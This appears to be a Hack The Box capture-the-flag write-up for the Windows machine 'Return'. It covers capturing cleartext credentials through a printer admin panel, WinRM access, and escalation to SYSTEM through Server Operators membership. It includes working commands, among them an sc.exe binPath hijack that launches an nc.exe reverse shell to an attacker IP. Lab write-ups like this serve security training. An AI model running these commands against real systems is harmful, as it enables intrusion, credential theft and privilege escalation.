+++
date = '2026-08-28T20:10:18+02:00'
draft = false
title = 'Return Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`09/04/2025`**

![pwn.png](/images/imgs_return/pwn.png)

---
# Introduction

**_Return_** is an **Easy-level Windows Domain Controller** that showcases the dangers of outbound authentication and misconfigured user groups.

The initial foothold involves interacting with a web-based **Printer Admin Panel**. By modifying the server address settings, we can coerce the application into sending the saved service account credentials in cleartext directly to our machine. After obtaining **WinRM** access as the **`svc-printer`** user, the privilege escalation phase requires leveraging membership in the **Server Operators** group to modify the executable path of a system service. Bypassing the need for **Metasploit**, we utilize a custom batch script to maintain shell stability and successfully extract the **root flag** as **`NT AUTHORITY\SYSTEM`**.

---
# Techniques Used

- **Outbound Authentication Coercion**

- **Server Operators Privilege Abuse**

- **PrivEsc through Service Configuration Abuse**

---
# Enumeration

## nmap

Initial scan on all ports:

```bash
nmap -p- return -Pn
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```

Targeted scan with scripts and version detection:

```bash
nmap -sC -sV return -Pn
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-31 17:41:29Z
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local
445/tcp  open  microsoft-ds? 
464/tcp  open  kpasswd5?     
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local
3269/tcp open  tcpwrapped    
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 18m37s
| smb2-time: 
|   date: 2025-12-31T17:41:37
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

**Open ports**:

- **53**/tcp - DNS

- **80**/tcp - HTTP (IIS)

- **88**/tcp - Kerberos

- **389/636/3268/3269**/tcp - LDAP/LDAPS

- **445**/tcp - SMB

- **5985**/tcp - WinRM

Based on the nmap output, I added **`return.local`** to my **`/etc/hosts`** file.

## Web Enumeration

Browsing to port **80**, the server hosts an **HTB Printer Admin Panel**.

![web1.png](/images/imgs_return/web1.png)

In the **`settings`** section, the application displayed a **`Server Address`** pointing to **`printer.return.local`** (which I promptly added to my **`/etc/hosts`** file) and the username for a service account: **`svc-printer`**.

![web2.png](/images/imgs_return/web2.png)

---
# Initial Access | Cleartext Credential Capture

Since the password field was already populated, my first thought was to inspect the **HTML element** and change it from **`type="password"`** to **`type="text"`**. I tried this, but the value was literally hardcoded as **`*******`**, so client-side manipulation was a dead end.

However, the application provided an **`update`** connection feature. Since it attempts to connect to the configured server using those saved credentials, I replaced the **`Server Address`** with my **`tun0`** IP address.

I set up a **netcat** listener on port **389** (**LDAP**):

```bash
nc -lvnp 389
```

When I clicked the **`update`** button, the server reached out to my machine and handed me the password in cleartext.

![pass.png](/images/imgs_return/pass.png)

**Password**: **`1edFg43012!!`**

I validated these credentials against the **remote management service** using **NetExec**:

```bash
nxc winrm return.local -u svc-printer -p '1edFg43012!!'
```

![validation.png](/images/imgs_return/validation.png)

**`(Pwn3d!)`**. I also ran a quick **RID brute-force** over **SMB** to check for interesting users or groups, but nothing immediately stood out.

```bash
nxc smb return.local -u svc-printer -p '1edFg43012!!' --rid-brute
```

![red.png](/images/imgs_return/red.png)

I connected to the machine via **Evil-WinRM** and grabbed the **user flag**.

```bash
evil-winrm -i return.local -u svc-printer -p '1edFg43012!!'
```

![userf.png](/images/imgs_return/userf.png)

---
# Privilege Escalation | Server Operators to SYSTEM

I started the internal enumeration manually by checking user's privileges:

```PowerShell
whoami /priv
```

![privs.jpeg](/images/imgs_return/privs.jpeg)

The output revealed a lot of potential **Local Privilege Escalation** vectors:

- **`SeMachineAccountPrivilege` (Add workstations to domain)**

- **`SeLoadDriverPrivilege` (Load and unload device drivers)**

- **`SeBackupPrivilege` (Back up files and directories)**

- **`SeRestorePrivilege` (Restore files and directories)**

**Note**: _These privileges offer severe attack paths. **`SeBackupPrivilege`** allows a user to read any file on the system (like the **`NTDS.dit`** or **`SAM` registry** hives) bypassing **ACLs**. Conversely, **`SeRestorePrivilege`** allows a user to overwrite any file on the system, which can be abused to replace system binaries or modify registry keys for execution. **`SeLoadDriverPrivilege`** allows loading malicious drivers into the kernel, leading to direct **`SYSTEM`** compromise. **`SeMachineAccountPrivilege`** can be abused for **Resource-Based Constrained Delegation (RBCD)** attacks._

Next, I enumerated the specific account properties and local group memberships for the **`svc-printer`** user:

```PowerShell
net user svc-printer
```

![group.png](/images/imgs_return/groups.png)

The output revealed that **`svc-printer`** was part of the **`*Server Operators`** built-in group.

**Note**: _Membership in **`Server Operators`** is extremely dangerous. Users in this group can log on to a server interactively, create and delete network shares, back up and restore files, and most importantly, start, stop, and configure system services._

Since low-hanging fruit like **`SeBackupPrivilege`** are often rabbit holes on **Hack The Box** machines, I decided to leverage the **Server Operators** group to modify a service executable path.

**Note**: _The escalation was performed using the built-in **`sc.exe`** utility to modify the **`binPath`** of the **Volume Shadow Copy** (**VSS**) service. **`sc.exe`** was selected because it is native to **Windows**, requires no additional tooling, and allows direct modification of a service's executable path in a single command. **`VSS`** was chosen as the target service because it runs with **`NT AUTHORITY\SYSTEM`** privileges, is typically set to **Manual** or **Disabled** (so it does not disrupt normal system operation when stopped/started), and its configuration is often overlooked, making the technique both reliable and relatively stealthy._

To do so, I uploaded **`nc.exe`** to the target.

## The OSCP-Friendly Stability Bypass

I could have pointed the **`binPath`** directly to a **netcat** reverse shell (**`nc.exe -e cmd.exe <attacker_ip> <attacker_port>`**), but this often causes stability problems, dropping the connection after a few seconds. The standard fix could be to catch a **Meterpreter** session and immediately migrate to a stable process. However, since I am preparing for the **OSCP** exam (where **Metasploit** is highly restricted), I engineered a native workaround to bypass the issue and grab the **root flag** directly.

I wrote a simple batch script (**`fall.bat`**) that prints the **root flag** and then executes **`cmd.exe`** to drop me into an interactive **`SYSTEM`** shell over the connection.

```PowerShell
Set-Content -Path C:\Users\svc-printer\Documents\fall.bat -Value "@echo off`ntype C:\Users\Administrator\Desktop\root.txt`ncmd.exe"
```

I then configured the **`VSS`** service **`binPath`** to use **`nc.exe`** and execute my batch script upon connection:

```PowerShell
sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e C:\Users\svc-printer\Documents\fall.bat 10.10.15.152 22667"
```

![privesc1.png](/images/imgs_return/privesc1.png)

I set up a **netcat** listener:

```bash
nc -lvnp 22667
```

I stopped and restarted the **VSS** service to trigger the payload:

```PowerShell
sc.exe stop vss
sc.exe start vss
```

![rootf.png](/images/imgs_return/rootf.png)

I successfully received an **`NT AUTHORITY\SYSTEM`** shell, with the **root flag** value cleanly printed directly to my terminal.


---
# Final Thoughts

**_Return_** is an excellent introductory **Active Directory** machine. The initial access phase is a reminder to always check where administrative panels are sending authentication requests. The privilege escalation phase demonstrates why excessive built-in group memberships (like **Server Operators**) are just as dangerous as direct administrative rights. Finally, engineering a custom batch script to bypass service instability is a great **OSCP**-style exercise in "**living off the land**", proving that relying on automated frameworks like **Metasploit** is rarely the only path forward.


